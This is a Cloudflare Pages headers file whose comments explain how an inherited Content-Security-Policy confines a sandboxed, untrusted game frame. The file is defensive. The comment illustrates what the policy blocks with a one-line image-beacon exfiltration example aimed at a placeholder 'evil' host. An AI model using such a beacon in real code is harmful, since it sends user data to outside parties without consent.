# Edge headers for Cloudflare Pages. Copied verbatim into dist/ by Vite.
#
# The load-bearing one is the CSP, and the reason it works is subtle: a srcdoc
# document *inherits the embedding page's policy*. So this policy is also the
# policy the untrusted game runs under -- and because the game frame is
# sandboxed without allow-same-origin, its origin is opaque, and an opaque
# origin matches no `'self'` at all. Every origin-based directive below
# therefore collapses to `'none'` inside the game:
#
#   connect-src 'self'  ->  the game can fetch/XHR/WebSocket/beacon nowhere
#   img-src 'self' ...  ->  no `new Image().src = 'https://evil/?' + data`
#   script-src 'self'   ->  no import() of remote code; the QR really is the game
#
# That is what closes the exfiltration and remote-loader gaps the sandbox
# attribute alone leaves open.
#
# `'unsafe-inline'` is required because the harness and the game itself are
# inline <script> tags in the srcdoc document, and inheritance means the parent
# must permit what the child needs. It is an acceptable trade only because no
# page here has an HTML injection sink -- there is no innerHTML, document.write,
# insertAdjacentHTML, eval or new Function anywhere in src/. Keep it that way.
#
# `'wasm-unsafe-eval'` is not optional: Brotli is WebAssembly, and compiling a
# module is blocked outright without it.
#
# Clickjacking is handled by X-Frame-Options rather than frame-ancestors,
# because frame-ancestors would be inherited by the game frame too and is not
# what you want applied to a document you are deliberately framing.
#
# `npm run check:headers` serves dist/ under these exact rules and runs the e2e
# suite against it, so this file is tested rather than assumed.

/*
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' blob: data:; font-src 'self'; connect-src 'self'; worker-src 'self' blob:; child-src 'self' blob:; frame-src 'self'; media-src 'self' blob: data:; object-src 'none'; base-uri 'none'; form-action 'none'
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Referrer-Policy: no-referrer
  Cross-Origin-Opener-Policy: same-origin
  Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(), usb=(), midi=(), serial=(), bluetooth=(), hid=()

# Hashed assets are immutable; the HTML entry points must never be.
/assets/*
  Cache-Control: public, max-age=31536000, immutable
